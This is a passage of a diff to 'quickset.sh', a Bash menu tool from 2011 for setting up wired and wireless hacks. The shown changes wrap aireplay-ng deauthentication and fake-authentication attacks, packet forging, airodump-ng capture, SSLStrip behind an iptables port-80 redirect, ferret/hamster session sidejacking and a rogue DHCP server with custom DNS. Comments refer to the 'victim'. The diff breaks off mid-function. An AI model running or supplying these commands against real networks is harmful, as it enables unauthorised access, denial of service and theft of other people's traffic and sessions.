@@ -3,7 +3,7 @@ function script_info()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: quickset.sh
-## Version: 0.9
+## Version: 1.3
 ## Copyright (C) <2009>  <Snafu>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -92,6 +92,8 @@ function script_info()
 ## svn up in update--(), this has some issue with regards to calling "svn up" from within a directory without .svn -->  Skipped '.' It gives an exit flag of 0 which defeats my purposes...  Only a factor if the user has quickset.sh in a directory called quickset that was not created with subversion itself.  To be dealt with at a later time 
 
 ## `ifconfig mon0 | grep HWaddr | cut -d- -f1-6 | sed 's/-/:/g'` will fix the random mac issue....
+
+### Add option for not autoauthenticating with regards to frag/chop?  It was causing issues when the victim was already on....
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -118,7 +120,7 @@ function script_info()
 
 ## Functionality to allow the user the enter device NIC names within the script on the off chance that the user has not already named them during init_setup--().  As of now, failure to fully enter in all required device NICs during init_setup--() will force the user to call naming--() thereby dramatically slowing down the effectivness of quickset.sh for a simple feature that should have already been thought of.
 
-## Sanitization of every input with regards to preventing user error/"hacking (gets me in the mindset for real coding languages in the future to actually think of what I am coding as a whole, and think about how it could be used against the box it is run on exploit wise, all because I failed to account for certain user inputs...Think SQLI)"
+## Sanitization of every input with regards to preventing "user error/hacking" (gets me in the mindset for real coding languages in the future to actually think of what I am coding as a whole, and think about how it could be used against the box it is run on sploit' wise, all because I failed to account for certain user inputs...Think SQLI)"
 
 ## Amplification mode....
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -166,13 +168,13 @@ echo -e "\033[1;32m\n-----------------------------------------------------------
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                    Initial NIC Setup
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-1) Wireless NIC           [\033[1;33m$pre_pii\033[36m] (Disregard this if already in Monitor Mode)
+1) Wireless NIC\033[1;32m {Disregard this if already in Monitor Mode}\033[36m [\033[1;33m$pre_pii\033[36m] 
 
-2) Enable Monitor Mode    [\033[1;33m$pre_pii\033[36m] (Do Not Make Input Here)
+2) Internet Connected NIC                                   [\033[1;33m$IE\033[36m]
 
-3) Internet Connected NIC [\033[1;33m$IE\033[36m]
+3) Monitor Mode NIC                                         [\033[1;33m$pii\033[36m]
 
-4) Monitor Mode NIC       [\033[1;33m$pii\033[36m]
+4) Enable Monitor Mode
 
 5) Kill Monitor Mode
 
@@ -196,16 +198,7 @@ case $init_var in
 		init_setup--
 	fi;;
 
-	2) if [[ $mon_live != "yes" ]]; then
-		echo -e "\033[31mYOU MUST DEFINE THE WIRELESS NIC FIRST"
-		read
-		init_setup--
-	else
-		monitormode--
-		init_setup--
-	fi;;
-
-	3) echo -e "\033[36m\nDefine NIC" 
+	2) echo -e "\033[36m\nDefine NIC" 
 	read IE
 	dev_check_var=$IE
 	dev_check--
@@ -216,7 +209,7 @@ case $init_var in
 		init_setup--
 	fi;;
 
-	4) echo -e "\033[36m\nDefine NIC" 
+	3) echo -e "\033[36m\nDefine NIC" 
 	read pii
 	dev_check_var=$pii
 	dev_check--
@@ -224,6 +217,15 @@ case $init_var in
 		init_setup--
 	else
 		pii= ## Nulled
+		init_setup--
+	fi;;
+
+	4) if [[ $mon_live != "yes" ]]; then
+		echo -e "\033[31mYOU MUST DEFINE THE WIRELESS NIC FIRST"
+		read
+		init_setup--
+	else
+		monitormode--
 		init_setup--
 	fi;;
 
@@ -535,8 +537,7 @@ esac
 
 dev_check--()
 {
-dev=$(ifconfig -s | awk '{print $1}' | grep -v Iface)
-echo $dev | grep -wi $dev_check_var > /dev/null
+ifconfig $dev_check_var > /dev/null
 if [ $? -ne 0 ];then
 	echo -e "\033[31mDevice does NOT exist"
 	sleep .7
@@ -564,7 +565,6 @@ cleanup_101--
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
 greet--()
 {
-echo "1" > /proc/sys/net/ipv4/ip_forward
 clear
 echo -e "\033[1;34m\n\n\n\n\n\n\n
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -572,11 +572,7 @@ echo -e "\033[1;34m\n\n\n\n\n\n\n
 QuickSet - A Quick Way to Setup a Wired/Wireless Hack
       Author: Snafu ----> will@configitnow.com
            Read Comments Prior to Usage
-          Version \033[1;33m$current_ver\033[1;34m (6 November 2011)\033[1;33m
-
-
-        IP Forwarding via the Kernel Enabled
-       Proceed to Routing Features to Disable\033[1;34m
+          Version \033[1;33m$current_ver\033[1;34m (25 November 2011)\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 sleep 2
@@ -601,35 +597,29 @@ Make Your Selection Below
 ~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
 1) Setup Menu
 
-2) Wireless Channel Recon
+2) WiFi Stuff
 
-3) Crack Some WiFi
+3) Quick Attacks
 
-4) Quick Attacks
+4) Routing Features
 
-5) Routing Features
+5) Check for Updates
 
-6) Check for Updates
-
-7) Exit Script\033[1;34m
+E)xit Script\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
 		1) setups--;;
 
-		2) sc=1-11 ## Channels to scan on
-		hop=1500 ## time between channel hops
-		scan--;;
+		2) wifi_101--;;
 
-		3) wifi_101--;;
+		3) atk_menu--;;
 
-		4) atk_menu--;;
+		4) routing--;;
 
-		5) routing--;;
+		5) update--;;
 
-		6) update--;;
-
-		7) cleanup--;;
+		e|E) cleanup--;;
 
 		*) main_menu--;;
 	esac
@@ -673,43 +663,6 @@ case $var in
 esac
 }
 
-scan--()
-{
-#ias_pid= ##PID for initial Airodump-NG scan
-clear
-echo -e "\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-            --Channel Scanning Parameters--
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-(S)pecified Channels [\033[1;33m$sc\033[36m]
-
-(H)op Frequency (ms) [\033[1;33m$hop\033[36m]
-
-(P)roceed\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
-	read var
-	case $var in
-		s|S) echo -e "\033[36m\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-11)"
-		read sc
-		scan--;;
-
-		h|H) echo -e "\033[36m\nHop Frequency in milliseconds?"
-		read hop
-		scan--;;
-
-		p|P) if [[ -z $sc || -z $hop ]];then
-			echo -e "\033[31mYou Must Enter the Channels and Hop to Proceed"
-			read
-			scan--
-		fi;;
-
-		*) scan--;;
-	esac
-
-xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & ias_pid=$!
-rescan--
-}
-
 ## wifi_101-- is at the bottom of this script due to length
 
 atk_menu--()
@@ -736,7 +689,7 @@ case $var in
 	1) ferret--;;
 
 	2) if [[ -f hamster.txt ]];then
-		xterm -bg black -fg grey -sb -rightbar -title Hamster -e hamster &
+		xterm -bg black -fg grey -sb -rightbar -title "Hamster" -e hamster &
 	else
 		echo -e "\033[31m\n\nhamster.txt MUST exist to run hamster"
 		read
@@ -958,132 +911,6 @@ esac
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ END setups-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##
 
-##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN scan-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
-rescan--()
-{
-clear
-echo -e "\033[36m\nWould you like to DeAuth to reveal hidden ESSIDS? (y or n)"
-read var
-case $var in
-	y|Y) deauth--;;
-	n|N) main_menu--;;
-	*) rescan--;;
-esac
-}
-
-deauth--()
-{
-sc= ## Nulled
-rb= ## Router BSSID
-#dea_pid= ## Deauth Scan PID
-
-	deauth_II--()
-	{
-	dt= ## DeAuth Type
-	cm= ## Client MAC
-
-		switch_deauth--()
-		{
-		kill -9 $dea_pid
-		sc= ## Nulled
-		while [ -z $sc ];do
-			echo -e "\033[36m\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-11)"
-			read sc
-		done
-
-		hop= ## Nulled
-		while [ -z $hop ];do	
-			echo -e "\033[36m\nMilliseconds between channel hops?"
-			read hop
-		done
-
-		xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel(s):$sc Hop:$hop" -e airodump-ng -f $hop $pii --channel $sc & ias_pid=$!
-		sleep .7
-		deauth--
-		}
-
-		deauth_III--()
-		{
-		r_d= ## Repeat DeAuth Variable
-		while [ -z $r_d ];do
-			echo -e "\033[36m\n(R)epeat DeAuth\n(C)hange or Add Client for DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth" 
-			read r_d
-		done
-
-		case $r_d in
-			r|R) 	case $dt in
-					b|B) echo -e "\033[1;33m" 
-					aireplay-ng $pii -0 3 -a $rb
-					deauth_III--;;
-
-					c|C) echo -e "\033[1;33m" 
-					aireplay-ng $pii -0 3 -a $rb -c $cm
-					deauth_III--;;
-				esac;;
-
-			c|C) clear 
-			deauth_II--;;
-
-			s|S) switch_deauth--;;
-
-			e|E) main_menu--;; 
-
-			*) deauth_III--;;
-		esac
-		}
-
-	while [ -z $dt ];do
-		echo -e "\033[36m\n(B)roadcast Deauth\n(C)lient Targeted DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth"
-		read dt
-	done
-
-	case $dt in
-		b|B) echo -e "\033[1;33m" 
-		aireplay-ng $pii -0 4 -a $rb
-		deauth_III--;;
-
-		c|C) cm= ## Nulled
-		while [ -z $cm ];do
-			echo -e "\033[36m\nClient MAC address?"
-			read cm
-		done
-
-		echo -e "\033[1;33m"
-		aireplay-ng $pii -0 4 -a $rb -c $cm
-		deauth_III--;;
-
-		s|S) switch_deauth--;;
-
-		e|E) main_menu--;;
-
-		*) deauth_II--;;
-	esac
-	}
-
-while [ -z $sc ];do
-	echo -e "\033[36m\nSpecified Channel? (1-11) {choose only one channel}"
-	read sc
-	case $sc in
-		1|2|3|4|5|6|7|8|9|10|11) ;;
-		*) sc= ## Nulled
-	esac
-
-done
-
-while [ -z $rb ];do
-	echo -e "\033[36m\nRouter BSSID?"
-	read rb
-done
-
-kill -9 $ias_pid
-kill -9 $dea_pid
-xterm -bg black -fg grey -sb -rightbar -title Airodump -e airodump-ng $pii --channel $sc --bssid $rb & dea_pid=$!
-sleep .7
-deauth_II--
-clear
-}
-##~~~~~~~~~~~~~~~~~~~~~~~~~ END scan-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
-
 ##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN atk_menu-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
 ferret--()
 {
@@ -1157,10 +984,10 @@ M)ain Menu\033[1;34m
 					esac
 				done
 
-				xterm -bg black -fg grey -sb -rightbar -title Ferret -e ferret -i $fer_dev --channel $fer_chan & 
+				xterm -bg black -fg grey -sb -rightbar -title "Ferret" -e ferret -i $fer_dev --channel $fer_chan & 
 				atk_menu--;;
 
-				wired) xterm -bg black -fg grey -sb -rightbar -title Ferret -e ferret -i $fer_dev & 
+				wired) xterm -bg black -fg grey -sb -rightbar -title "Ferret" -e ferret -i $fer_dev & 
 				atk_menu--;;
 			esac
 
@@ -1199,25 +1026,24 @@ ssl_tail="Yes" ## SSLStrip Tail Log
 	{
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
 	if [[ $lck_fav == "Yes" && $ses_kil == "Yes" ]];then
-		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port &
+		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port & ssl_pid=$!
 	elif [[ $lck_fav == "Yes" && $ses_kil == "No" ]];then
-		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port &
+		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port & ssl_pid=$!
 	elif [[ $lck_fav == "No" && $ses_kil == "Yes" ]];then
-		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port &
+		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port & ssl_pid=$!
 	else
-		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -l $lst_port &
+		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -l $lst_port & ssl_pid=$!
 	fi
 
-	sleep 2
+	sleep 5
 	case $ssl_tail in
-		Yes) xterm -bg black -fg grey -sb -rightbar -title "SSLStrip Tail" -e tail -f $sstrip_log & ;;
+		Yes) xterm -bg black -fg grey -sb -rightbar -title "SSLStrip Tail $(pwd)/$sstrip_log" -e tail -f $sstrip_log & ;;
 	esac
 
 	atk_menu--
 	}
 
 	strip_em_II--()
-### kill these worthless while -z's
 	{
 	clear
 	echo -e "\033[1;34m
@@ -1474,7 +1300,6 @@ dns_cus="No" ## Use custom DNS entries for DHCP server, defaulted to nameservers
 }
 
 dhcp_svr--()
-### worthless -zs?
 {
 var= ## Nulled
 dhcp_svr_stat= ## Variable for Cleanup Purposes..
@@ -1559,13 +1384,11 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 		7) echo -e "\033[36m\nCreate Custom DNS Entries? (y or n)"
 		read dns_cus
 		case $dns_cus in
-			y|Y) dhcp_tail="Yes" 
-			echo -e "\033[1;32mEnter the desired IP Addressess of the DNS seperated by a space
+			y|Y) echo -e "\033[1;32mEnter the desired IP Addressess of the DNS seperated by a space
 i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 			read dns_entry ;;
 
-			n|N) dns_cus="No"
-			dhcp_tail="No" ;;
+			n|N) dns_cus="No" ;;
 
 			*) dns_cus= ;; ## Nulled
 		esac
@@ -1587,8 +1410,8 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 	cat /dev/null > /tmp/dhcpd.conf
 	## start dhcpd daemon with special configuration file
 	echo -e "\033[1;33mGenerating /tmp/dhcpd.conf"
-	echo "default-lease-time 60;">> /tmp/dhcpd.conf
-	echo "max-lease-time 72;" >> /tmp/dhcpd.conf
+	echo "default-lease-time 3600;">> /tmp/dhcpd.conf
+	echo "max-lease-time 7200;" >> /tmp/dhcpd.conf
 	echo "ddns-update-style none;" >> /tmp/dhcpd.conf
 	echo "authoritative;" >> /tmp/dhcpd.conf
 	echo "log-facility local7;" >> /tmp/dhcpd.conf
@@ -1612,9 +1435,9 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 	dhcp_svr_II--()
 	{
 	echo -e "\033[1;33m"
-### Should I make the dhcp server killable just like everything else, if not; why?
-# 	xterm -bg black -fg grey -sb -rightbar -hold -title "DHCP Server" -e dhcpd3 -cf $DHCPDCONF $dhcp_dev &
-	dhcpd3 -cf $DHCPDCONF $dhcp_dev &
+	##Gives dhcpd the permissions it needs
+	mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd
+	dhcpd3 -cf $DHCPDCONF -pf /var/run/dhcpd/dhcpd.pid $dhcp_dev &
 	dhcp_svr_stat="active"
 	if [ $? -ne 0 ];then
 		echo -e "\033[31mThe DHCP server could not be started\nPress Enter to Return to Routing Features"
@@ -1632,7 +1455,7 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 		esac
 
 		case $dhcp_tail in
-			Yes) xterm -bg black -fg grey -sb -rightbar -title "DHCP Server Tail" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
+			Yes) xterm -bg black -fg grey -sb -rightbar -title "DHCP Server Tail /var/lib/dhcp3/dhcpd.leases" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
 		esac
 
 		echo -e "\033[1;33m\n\n\n\nDHCP server started succesfully\n\n"
@@ -1915,11 +1738,6 @@ wifi_101--()
 trap trap_101-- INT
 
 ##~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##
-
-	
-
-	
-
 	tchan--()
 	{
 	tc= ## tgt channel
@@ -1980,9 +1798,7 @@ trap trap_101-- INT
 	st_1--()
 	{
 	case $parent in
-		venue) kill -9 $ias_pid
-		kill -9 $dea_pid
-		kill -9 $wifi_ias_pid
+		venue) kill -9 $wifi_ias_pid
 		kill -9 $wifi_dea_pid
 		clear;;
 
@@ -2018,8 +1834,6 @@ Press Enter to Proceed
 ----------------------
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 		read
-		kill -9 $ias_pid
-		kill -9 $dea_pid
 		kill -9 $wifi_ias_pid
 		kill -9 $wifi_dea_pid
 		clear;;
@@ -2075,22 +1889,15 @@ YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read
-	kill -9 $ias_pid &
-	kill -9 $dea_pid &
 	sleep .7
 	}
-
-
-
-	
-
-	
 ##~~~~~~~~~~~~~~~~~~~~ END wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##
 
 ##~~~~~~~~~~~~~~~~~~~~ BEGIN Starting wifi_101-- Function ~~~~~~~~~~~~~~~~~~~~~##
 	venue--()
 	{
 	parent= ## Nulled
+	parent_VII= ## Nulled
 	clear
 	echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -2155,7 +1962,8 @@ R)eturn to Main Menu\033[1;34m
 		7) parent="venue"
 		forge_out--;;
 
-		8) ctech--;;
+		8) parent="venue"
+		ctech--;;
 
 		9) parent="venue"
 		crack--;;
@@ -2198,26 +2006,26 @@ M)ain Menu\033[1;34m
 	case $var in
 		1) echo -e "\033[36m\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-11)"
 		read sc
-		scan--;;
+		wifi_scan--;;
 
 		2) echo -e "\033[36m\nHop Frequency in milliseconds?"
 		read hop
-		scan--;;
+		wifi_scan--;;
 
 		3) if [[ -z $sc || -z $hop ]];then
 			echo -e "\033[31mYou Must Enter the Channels and Hop to Proceed"
 			read
-			scan--
+			wifi_scan--
 		fi;;
 
 		p|P) venue--;;
 
 		m|M) main_menu--;;
 
-		*) scan--;;
+		*) wifi_scan--;;
 	esac
 
-	xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
+	xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
 	venue--
 	}
 
@@ -2283,15 +2091,17 @@ M)ain Menu\033[1;34m
 			*) dump--;;
 		esac
 
+		kill -9 $wifi_ias_pid
+		kill -9 $wifi_dea_pid
 		if [[ -z $b ]];then
-			xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel:$tc File:$cf Format:$of" -e airodump-ng $pii --channel $tc -w $cf --output-format $of &
+			xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel: $tc File: $cf Format: $of" -e airodump-ng $pii --channel $tc -w $cf --output-format $of &
 		else
-			xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel:$tc File:$cf BSSID:$b Format:$of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format $of &
+			xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel: $tc File: $cf BSSID: $b Format: $of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format $of &
 		fi
 
 		venue--;;
 
-		automate) xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel:$tc File:$cf Format:$of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format pcap & ;;
+		automate) xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel: $tc File: $cf Format: $of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format pcap & ;;
 	esac
 	}
 
@@ -2321,7 +2131,7 @@ M)ain Menu\033[1;34m
 				read hop
 			done
 
-			xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel(s):$sc Hop:$hop" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
+			xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
 			sleep .7
 			wifi_deauth--
 			}
@@ -2383,6 +2193,7 @@ M)ain Menu\033[1;34m
 		esac
 		}
 
+	clear
 	while [ -z $sc ];do
 		echo -e "\033[36m\nSpecified Channel? (1-11) {choose only one channel}"
 		read sc
@@ -2400,7 +2211,7 @@ M)ain Menu\033[1;34m
 
 	kill -9 $wifi_ias_pid
 	kill -9 $wifi_dea_pid
-	xterm -bg black -fg grey -sb -rightbar -title Airodump -e airodump-ng $pii --channel $sc --bssid $rb & wifi_dea_pid=$!
+	xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng $pii --channel $sc --bssid $rb & wifi_dea_pid=$!
 	sleep .7
 	wifi_deauth_II--
 	clear
@@ -2475,7 +2286,7 @@ M)ain Menu\033[1;34m
 			auth--;;
 
 			8) echo -e "\033[36m\n.xor file? (Leave Blank to Null)"
-			read $xor
+			read ska_xor
 			auth--;;
 
 			9) if [[ -z $tc || -z $b || -z $sm || -z $ppb || -z $rd || -z $kaf ]];then
@@ -2491,14 +2302,14 @@ M)ain Menu\033[1;34m
 			*) auth--;;
 		esac
 
-		if [[ -z $hid_essid && -z $xor ]];then
+		if [[ -z $hid_essid && -z $ska_xor ]];then
 			xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm &
-		elif [[ -z $xor ]];then
+		elif [[ -z $ska_xor ]];then
 			xterm -bg black -fg grey -sb -rightbar -title "Fake Auth Hidden ESSID" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" &
 		elif [[ -z $hid_essid ]];then
-			xterm -bg black -fg grey -sb -rightbar -title "Fake Auth w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $xor &
+			xterm -bg black -fg grey -sb -rightbar -title "Fake Auth w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor &
 		else
-			xterm -bg black -fg grey -sb -rightbar -title "Fake Auth Hidden ESSID w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $xor -e "$hid_essid" &
+			xterm -bg black -fg grey -sb -rightbar -title "Fake Auth Hidden ESSID w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor -e "$hid_essid" &
 		fi
 
 		venue--;;
@@ -2545,8 +2356,13 @@ M)ain Menu\033[1;34m
 	read rt
 	case $parent in
 		venue) case $rt in
-			1|2|3|4) 
-			rppb=500 ## Replayed packets per burst
+			1|2|3|4) rppb=500 ## Replayed packets per burst
+			case $rt in
+				1|2) parent_II="fragchop";;
+				3|4) parent_II="broadarp";;
+			esac
+
+			e= ## Nulled
 			rtech_II--;;
 
 			p|P) venue--;;
@@ -2554,42 +2370,45 @@ M)ain Menu\033[1;34m
 			m|M) main_menu--;;
 			
 			*) rtech--;;
-		esac
-
-			case $rt in
-				1|2) parent_II="fragchop";;
-				3|4) parent_II="broadarp";;
-			esac;;
+		esac;;
 
 		automate) case $rt in
-				1|2|3|4) b= ## tgt bssid
-				sm= ## source mac
-				rd=10 ## reauthentication delay
-				ppb=1 ## Re-authentication packets per burst
-				kaf=3 ## keep-alive frequency
-				rppb=500 ## Replayed packets per burst
-				rtech_II--;;
-				
-				*) rtech--;;
-			esac;;
+			1|2|3|4) b= ## tgt bssid
+			sm= ## source mac
+			rd=10 ## reauthentication delay
+			ppb=1 ## Re-authentication packets per burst
+			kaf=3 ## keep-alive frequency
+			rppb=500 ## Replayed packets per burst
+			e= ## Nulled
+			rtech_II--;;
+
+			p|P) automate--;;
+
+			m|M) main_menu--;;
+
+			*) rtech--;;
+		esac;;
+
 	esac
 	}
 
 	pforge--()
 	{
+	nowdate=`date +%M%S` ## Timestamp for files
 	pf_var= ## variable name for -w filename
 
-		pforge_II--()
+		pforge_S--()
 		{
+		clear
 		echo -e "\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-     --Advanced Packet Forging Options--
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-1) .xor filename  [\033[1;33m$xor\033[36m]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      --Simple Packet Forging Options--
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
+1) Tgt BSSID      [\033[1;33m$b\033[36m]
 
-2) Source IP      [\033[1;33m$src_ip\033[36m]
+2) Source MAC     [\033[1;33m$sm\033[36m]
 
-3) Destination IP [\033[1;33m$dst_ip\033[36m]
+3) .xor filename  [\033[1;33m$xor\033[36m]
 
 4) Proceed
 
@@ -2597,34 +2416,90 @@ P)revious Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 		read var
 		case $var in
-			1) echo -e "\033[36m\n.xor filename?"
+			1) echo -e "\033[36m\nTgt BSSID?"
+			read b
+			pforge_S--;;
+
+			2) echo -e "\033[36m\nSource MAC?"
+			read sm
+			pforge_S--;;
+
+			3) echo -e "\033[36m\n.xor filename?"
 			read xor
-			pforge_II--;;
+			pforge_S--;;
 
-			2) echo -e "\033[36m\nSource IP?"
-			read src_ip
-			pforge_II--;;
-
-			3)echo -e "\033[36m\nDestination IP?"
-			read dst_ip
-			pforge_II--;;
-
-			4) if [[ -z $xor || -z $src_ip || -z $dst_ip ]];then
+			4) if [[ -z $b || -z $sm || -z $xor ]];then
 				echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 				sleep 1
-				pforge_II--
+				pforge_S--
 			fi;;
 
 			p|P) pforge--;;
 
-			*) pforge_II--;;
+			*) pforge_S--;;
+		esac
+		}
+
+		pforge_A--()
+		{
+		clear
+		echo -e "\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     --Advanced Packet Forging Options--
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
+1) Tgt BSSID      [\033[1;33m$b\033[36m]
+
+2) Source MAC     [\033[1;33m$sm\033[36m]
+
+3) .xor filename  [\033[1;33m$xor\033[36m]
+
+4) Source IP      [\033[1;33m$src_ip\033[36m]
+
+5) Destination IP [\033[1;33m$dst_ip\033[36m]
+
+6) Proceed
+
+P)revious Menu\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+		read var
+		case $var in
+			1) echo -e "\033[36m\nTgt BSSID?"
+			read b
+			pforge_A--;;
+
+			2) echo -e "\033[36m\nSource MAC?"
+			read sm
+			pforge_A--;;
+
+			3) echo -e "\033[36m\n.xor filename?"
+			read xor
+			pforge_A--;;
+
+			4) echo -e "\033[36m\nSource IP?"
+			read src_ip
+			pforge_A--;;
+
+			5)echo -e "\033[36m\nDestination IP?"
+			read dst_ip
+			pforge_A--;;
+
+			6) if [[ -z $xor || -z $src_ip || -z $dst_ip ]];then
+				echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
+				sleep 1
+				pforge_A--
+			fi;;
+
+			p|P) pforge--;;
+
+			*) pforge_A--;;
 		esac
 		}
 
 	case $parent in
-		venue) echo -e "\033[1;34m
+		venue) clear
+		echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    --Packet Forging Mode--
+   --Packet Forging Mode--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
 1) Simple Mode {Recommended}
 
@@ -2643,67 +2518,98 @@ M)ain Menu\033[1;34m
 		esac
 
 		case $p_mode in
-			simple) xor= ## .xor file
-			while [ -z $xor ];do
-				echo -e "\033[36m
-**************
-.xor filename?
-**************\n"
-				read xor
